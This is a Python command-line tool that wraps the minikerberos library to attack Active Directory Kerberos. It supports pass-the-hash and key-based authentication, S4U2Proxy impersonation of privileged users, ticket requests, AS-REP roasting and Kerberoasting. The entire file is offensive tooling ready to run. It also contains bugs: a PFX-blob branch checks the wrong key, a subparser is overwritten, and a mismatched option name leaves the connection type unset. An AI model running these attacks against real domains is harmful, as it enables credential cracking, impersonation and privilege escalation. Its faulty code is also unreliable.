import sys
import argparse
import asyncio


def ldap_url(auth_options):
    url_format = {
        "kerb_password": f"kerberos+password://{{domain}}\\{{username}}:{{password}}@{{fqdn}}/?dc={{dcip}}",
        "kerb_rc4": f"kerberos+rc4://{{domain}}\\{{username}}:{{nt}}@{{fqdn}}/?dc={{dcip}}",
        "kerb_aes": f"kerberos+aes://{{domain}}\\{{username}}:{{aeskey}}@{{fqdn}}/?dc={{dcip}}",
        "kerb_ccache": f"kerberos+ccache://{{domain}}\\{{username}}:creds.ccache@127.0.0.1",
        "kerb_pfx": f"kerberos+pfx://{{domain}}\\{{username}}:{{password}}@{{dcip}}/?certdata={{pfx}}",
        "kerb_pfxblob": f"kerberos+pfxstr://{{domain}}\\{{username}}:{{password}}@{{dcip}}/?certdata={{b64blob}}"        
    }
    
    if "nt" in auth_options and auth_options["nt"]:
        url_type = "kerb_rc4"
    elif "aeskey" in auth_options and auth_options["aeskey"]:
        url_type = "kerb_aes"
    elif "pfx" in auth_options and auth_options["pfx"]:
        url_type = "kerb_pfx"
    elif "pfxblob" in auth_options and auth_options["pfx"]:
        url_type = "kerb_pfxblob"
    elif "nopass" in auth_options and auth_options["nopass"]:
        url_type = "kerb_ccache"
    elif "password" in auth_options and auth_options["password"]:
        url_type = "kerb_password"
    
    format_string = url_format[url_type]
    return format_string.format(**auth_options)
    
    
def arg_parse():
    parser = argparse.ArgumentParser(add_help=True, description="minikerb syntax", formatter_class=argparse.RawDescriptionHelpFormatter)
    
    auth_group = parser.add_argument_group('Auth')
    auth_group.add_argument("-u", "--username", action="store", help="Username")
    auth_group.add_argument("-p", "--password", action="store", help="Password")
    auth_group.add_argument("-nt", action="store", help="NT hash (just the hash, no :)")
    auth_group.add_argument("-aeskey", action="store", help="AES 128/256 Key")
    auth_group.add_argument("-pfx", action="store", help="pfx file to use for auth")
    auth_group.add_argument("-pfxblob", action="store", help="pfx blob because reasons")
    auth_group.add_argument("--no-pass", action="store_true", help="Use CCACHE file, make sure KRB5CCNAME is set")

    target_group = parser.add_argument_group('Target')
    target_group.add_argument("-d", "--domain", action="store", help="target domain name (domain.local)")
    target_group.add_argument("-dcip", action="store", help="target dc IP address")
    target_group.add_argument("-fqdn", action="store", help="target DC hostname (required for Kerberos)")
    
    export_group = parser.add_argument_group('Export types')
    export_group.add_argument("-ccache", help="ccache file to store")
    export_group.add_argument("-kirbi", help="kirbi file to store")  
    
    # done with global stuff what do we want to run
    subparsers = parser.add_subparsers(dest='command', help='Command to run')
    
    #s4u2proxy
    s4u_parser = subparsers.add_parser('s4u2proxy', help='Perform S4U2Proxy impersonation')
    s4u_parser = parser.add_argument_group('S4U Args')
    s4u_parser.add_argument("-spn", action="store", help="Target spn to impersonate. \n" \
        "Example: cifs/targethost.domain.local@domain.local")
    s4u_parser.add_argument("-targetuser", action="store", help="target user to impersonate \n" \
        "Example: domainadmin@domain.local")
    
    #getTGT
    tgt_parser = subparsers.add_parser('getTGT', help='Get a Kerberos TGT')
    tgt_parser.add_argument('getTGT', help="Get a Kerberos TGT")
    tgt_parser.add_argument("-nopac", action="store_true", help="Don't request a PAC in the TGT")

    #getTGS
    tgs_parser = subparsers.add_parser('getTGS', help='Get a Kerberos TGS')
    tgs_parser.add_argument('getTGS', help="Get a Kerberos TGS")
    tgs_parser.add_argument('--cross-domain', action="store_true", help="Enable if SPN is in another domain")
    tgs_parser.add_argument("-spn", action="store", help="Target spn to impersonate. \n" \
        "Example: cifs/targethost.domain.local@domain.local")
    
    #asreproast
    asrep = subparsers.add_parser("asreproast", help="Perfrom ASREPRoasting")
    asrep.add_argument('-e', '--etypes', default='23, 17, 18', help="Encryption types to use. Default: 23, 17, 18")
    asrep.add_argument('-o', '--outfile', help='Write results to this file instead of printing them')
    asrep.add_argument('users', nargs ='*', help='User/username to kerberoast. Can be a file with usernames, or a single username.')
    
    #kerberoast
    kroast = subparsers.add_parser("kerberoast", help="Perform Kerberoasting")
    kroast.add_argument('users', nargs ='*', help='User/username to kerberoast. Can be a file with usernames, or a single username.')
    kroast.add_argument('--cross-domain', action='store_true', help='SPN is in another domain.')
    kroast.add_argument('-e', '--etypes', default='23,17,18', help='Encryption types to use. Default: 23,17,18')
    kroast.add_argument('-o', '--out-file', help='Write results to this file instead of printing them')



    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    return args
    

def main():
    
    auth_options = arg_parse()
    auth_params = vars(auth_options)
  
    try:
        url = ldap_url(auth_params)
        #print(f"Connection URL: {url}")
    except ValueError as e:
        print(f"Error: {e}")
        exit()
    
    
    
    #with url built, do the thing
    if auth_options.command == 's4u2proxy':
        from minikerberos.examples.getS4U2proxy import getS4U2proxy
        asyncio.run(getS4U2proxy(kerberos_url=url, spn=auth_options.spn, targetuser=auth_options.targetuser, kirbifile=auth_options.kirbi, ccachefile=auth_options.ccache))
    if auth_options.command == 'getTGT':
        from minikerberos.examples.getTGT import getTGT
        asyncio.run(getTGT(kerberos_url=url, kirbifile=auth_options.kirbi, ccachefile=auth_options.ccache, nopac=auth_options.nopac))
    if auth_options.command == 'getTGS':
        from minikerberos.examples.getTGS import getTGS
        asyncio.run(getTGS(kerberos_url=url, spn=auth_options.spn, kirbifile=auth_options.kirbi, ccachefile=auth_options.ccache, cross_domain=auth_options.cross_domain))
    if auth_options.command == 'asreproast':
        from minikerberos.examples.asreproast import asreproast
        asyncio.run(asreproast(kerberos_server=auth_options.fqdn, users=auth_options.users, domain=auth_options.domain, out_file=auth_options.outfile, etypes=auth_options.etypes))
    if auth_options.command == 'kerberoast':
        from minikerberos.examples.spnroast import spnroast
        asyncio.run( spnroast(connection_url=url, users=auth_options.users, domain=auth_options.domain, out_file=auth_options.out_file, etypes=auth_options.etypes, cross_domain=auth_options.cross_domain))

    


if __name__ == '__main__':
    main()
